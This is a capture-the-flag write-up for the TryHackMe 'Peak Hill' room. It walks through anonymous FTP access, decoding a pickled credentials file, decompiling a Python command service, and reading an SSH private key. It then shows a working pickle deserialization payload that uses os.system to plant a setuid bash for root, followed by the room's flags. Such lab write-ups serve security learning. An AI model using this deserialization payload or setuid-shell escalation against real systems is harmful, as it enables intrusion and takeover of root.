# Tryhackme.com Room : Peak Hill

`https://tryhackme.com/room/peakhill`



## Instance

```
export IP='10.10.158.41'
```

## Nmap

```
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.32.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```



## Initial foothold

We can login to the `ftp` using `anonymous`

We find a file named `.creds` which contains a binary blob :

```
1000000000000011010111010111000100000000001010000101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001101010111000100000001010110000000000100000000000000000000000001110101011100010000001010000110011100010000001101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100010111000100000100010110000000000100000000000000000000000001101000011100010000010110000110011100010000011001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011010101110001000001110101100000000001000000000000000000000000011100100111000100001000100001100111000100001001010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001000110000011100010000101001101000000001011000011001110001000010110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110111011100010000110001011000000000010000000000000000000000000101111101110001000011011000011001110001000011100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110000011100010000111101011000000000010000000000000000000000000110011101110001000100001000011001110001000100010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101100111000100010010010110000000000100000000000000000000000001101100011100010001001110000110011100010001010001011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001101010111000100010101010110000000000100000000000000000000000000110011011100010001011010000110011100010001011101011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010111000100011000010110000000000100000000000000000000000000110001011100010001100110000110011100010001101001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011001001110001000110110110100000001101100001100111000100011100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110010011100010001110101011000000000010000000000000000000000000100000001110001000111101000011001110001000111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110010011100010010000001011000000000010000000000000000000000000110010101110001001000011000011001110001001000100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110101011100010010001101011000000000010000000000000000000000000110100101110001001001001000011001110001001001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001110000111000100100110011010000000110110000110011100010010011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011011101110001001010000101100000000001000000000000000000000000011001000111000100101001100001100111000100101010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001101110001001010110101100000000001000000000000000000000000011010110111000100101100100001100111000100101101010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100111001011100010010111001011000000000010000000000000000000000000111010001110001001011111000011001110001001100000101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110110011100010011000101011000000000010000000000000000000000000111001101110001001100101000011001110001001100110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100111001011100010011010001101000000110011000011001110001001101010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001100110111000100110110010110000000000100000000000000000000000001110111011100010011011110000110011100010011100001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011000101110001001110010110100000010110100001100111000100111010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011010001110001001110110110100000010011100001100111000100111100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110100011100010011110101011000000000010000000000000000000000000011000001110001001111101000011001110001001111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110110011100010100000001011000000000010000000000000000000000000110111001110001010000011000011001110001010000100101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010011100010100001101011000000000010000000000000000000000000110001101110001010001001000011001110001010001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001100110111000101000110011010000000100010000110011100010100011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011011001110001010010000110100001000001100001100111000101001001010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011100001110001010010100110100000011110100001100111000101001011010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110111011100010100110001101000001010011000011001110001010011010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101000111000101001110011010000011111010000110011100010100111101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100110111000101010000011010000000100010000110011100010101000101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001101000111000101010010011010000010110010000110011100010101001101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011000101110001010101000110100000001101100001100111000101010101010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000001110001010101100101100000000001000000000000000000000000011100000111000101010111100001100111000101011000010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110000011100010101100101101000000110011000011001110001010110100110010100101110
```

When we decode it using cyberchef we get this strange string :

```
..]q.(X
...ssh_pass15q.X....uq..q.X	...ssh_user1q.X....hq..q.X
...ssh_pass25q.X....rq..q	X
...ssh_pass20q
h..q.X	...ssh_pass7q.X...._q
.q.X	...ssh_user0q.X....gq..q.X
...ssh_pass26q.X....lq..q.X	...ssh_pass5q.X....3q..q.X	...ssh_pass1q.X....1q..q.X
...ssh_pass22q.h
.q.X
...ssh_pass12q.X....@q..q.X	...ssh_user2q X....eq!.q"X	...ssh_user5q#X....iq$.q%X
...ssh_pass18q&h
.q'X
...ssh_pass27q(X....dq).q*X	...ssh_pass3q+X....kq,.q-X
...ssh_pass19q.X....tq/.q0X	...ssh_pass6q1X....sq2.q3X	...ssh_pass9q4h..q5X
...ssh_pass23q6X....wq7.q8X
...ssh_pass21q9h..q:X	...ssh_pass4q;h..q<X
...ssh_pass14q=X....0q>.q?X	...ssh_user6q@X....nqA.qBX	...ssh_pass2qCX....cqD.qEX
...ssh_pass13qFh..qGX
...ssh_pass16qHhA.qIX	...ssh_pass8qJh..qKX
...ssh_pass17qLh).qMX
...ssh_pass24qNh>.qOX	...ssh_user3qPh..qQX	...ssh_user4qRh,.qSX
...ssh_pass11qTh
.qUX	...ssh_pass0qVX....pqW.qXX
...ssh_pass10qYh..qZe.
```

Hmm not sure what to do with this. It does have references to `ssh_pass` and `ssh_user`.

Maybe we can create a dictionary and try those credentials on `ssh`? 

What do the `...` represents ? Wildcards ? Separator ?

My initial hunch was to try to `pickle` the file since the challenge mention pickle.

Didn't work when I tried to pickle the `.creds` file which is kinda normal since it's binary encoded as a string. Then I tried with the decoded representation but again it didn't work.

So I went on to bruteforce with a custom dict that I created from the `.creds` file but it didn't feel right.

I looked up a write up for a hint and right in the beginning they mentionned `pickle` so back to it !

What I ended up doing is `.creds` -> `From Binary` -> `To Hex` then I wrote the `hex` to a file.

And bingo, we can load the file using `pickle` !

Now we end up with an array like this :

```
[('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', 'l'), ('ssh_pass5', '3'), ('ssh_pass1', '1'), ('ssh_pass22', '_'), ('ssh_pass12', '@'), ('ssh_user2', 'e'), ('ssh_user5', 'i'), ('ssh_pass18', '_'), ('ssh_pass27', 'd'), ('ssh_pass3', 'k'), ('ssh_pass19', 't'), ('ssh_pass6', 's'), ('ssh_pass9', '1'), ('ssh_pass23', 'w'), ('ssh_pass21', '3'), ('ssh_pass4', 'l'), ('ssh_pass14', '0'), ('ssh_user6', 'n'), ('ssh_pass2', 'c'), ('ssh_pass13', 'r'), ('ssh_pass16', 'n'), ('ssh_pass8', '@'), ('ssh_pass17', 'd'), ('ssh_pass24', '0'), ('ssh_user3', 'r'), ('ssh_user4', 'k'), ('ssh_pass11', '_'), ('ssh_pass0', 'p'), ('ssh_pass10', '1')]
```

Then some python magic to retrieve the user and pass :

```python
user = ''.join([val[1] for val in sorted(pickled) if 'user' in val[0]])
passwd = ''.join([val[1] for val in sorted(pickled) if 'pass' in val[0]])
```

Which give us the credentials :

```
gherkin:p11_@r0und_tch3_w0rldkl3s_@1
```

But these didn't work. After further inspection, the sort didn't work correctly for the password. 

```
('ssh_pass0', 'p'), ('ssh_pass1', '1'), ('ssh_pass10', '1'), ('ssh_pass11', '_'), ('ssh_pass12', '@'), ('ssh_pass13', 'r'),....
```

Let's fix this :

```
passwd = "".join([v[1] for v in sorted([val for val in pickled if 'pass' in val[0]], key=lambda x:int(x[0].split("pass")[-1]))])
```

Which give the correct credentials :

```
gherkin:p1ckl3s_@11_@r0und_th3_w0rld
```

## Lateral movement

We find the file `/home/gherkin/cmd_service.pyc`. Let's retrieve it using `scp` and uncompile it using `uncompyle6`

We now got the python source :

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356L)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive('Username: ').strip()
        password_input = self.receive('Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send('Wrong credentials!')
            return None
        self.send('Successfully logged in!')
        while True:
            command = self.receive('Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + '\n'
        self.request.sendall(string)

    def receive(self, prompt='> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
```



We first retrieve the password encoded at the beginning of the file :

```
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356L)
```

```
dill:n3v3r_@_d1ll_m0m3nt
```

We can't `su` using these credentials.

Let's connect to the service running on port `7321`.

After entering the credentials, we get shell cmd execution as `dill`.

We can simply run `cat /home/dill/.ssh/id_rsa` and we get the private key :

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
/V7pwBay5mHnsAAAAKam9obkB4cHMxNQE=
-----END OPENSSH PRIVATE KEY-----
```

And we login using `ssh` and the key.

We are now `dill` and we can retrieve the flag `/home/dill/user.txt`:

```
f1e13335c47306e193212c98fc07b6a0
```



## Priv esc

Running `sudo -l` as `dill` we get :

```
User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

This is a binary. We don't have read permissions so we can't retrieve and decompile the binary.

We enter some random strings and get the following output :

```
failed to decode base64
```

We then enter a base64 string and get 

```
this not grow did not grow on the Peak Hill Farm! :(
```

Trying some random strings, we finally get an error :

```
Traceback (most recent call last):
  File "peak_hill_farm.py", line 18, in <module>
ValueError: unregistered extension code 136
[2076] Failed to execute script peak_hill_farm
```

Hmm interesting.

We entered `gogo` and get `unregistered extension code 136` why is that ?

Well it seems that first the string is `base64` decoded then interpreted as bytecode !

```
import base64
base64.b64decode('gogo')[1]	# --> 136
```

So here we go, we need to create a `base64` encoded python bytecode.

I tried for a while to craft some bytecode but in the end, it was just a pickle vulnerability...

So here is how we create the payload :

```python
import base64
import os
import pickle

class pwn:
    def __reduce__(self):
        return os.system, ('cp /bin/bash /tmp/bash && chmod +s /tmp/bash',)

print(base64.b64encode(pickle.dumps(pwn())).decode())
```

We then launch it using ` python3 payload.py | sudo /opt/peak_hill_farm/peak_hill_farm`

And then we can launch `/tmp/bash -p` and we are now `root`.



We take a look at `/root` and we see the flag but the filename is ` root.txt ` so when we `cat root.txt` we don't get it because of the spaces.

We can just `cat *.txt*` and we get the flag :

```
e88f0a01135c05cf0912cf4bc335ee28
```



## Wrap up

* This was a nice box. The fact that we couldn't retrieve the binary made it a bit more difficult. The writeup I looked at afterward was able to retrieve the binary (now patched) which made it easier to understand what was happening.
* Did take me a while to understand that the `.creds` file was a pickle dump. Now I got a hint at what a pickle dump look like, might be easier to spot from now on.

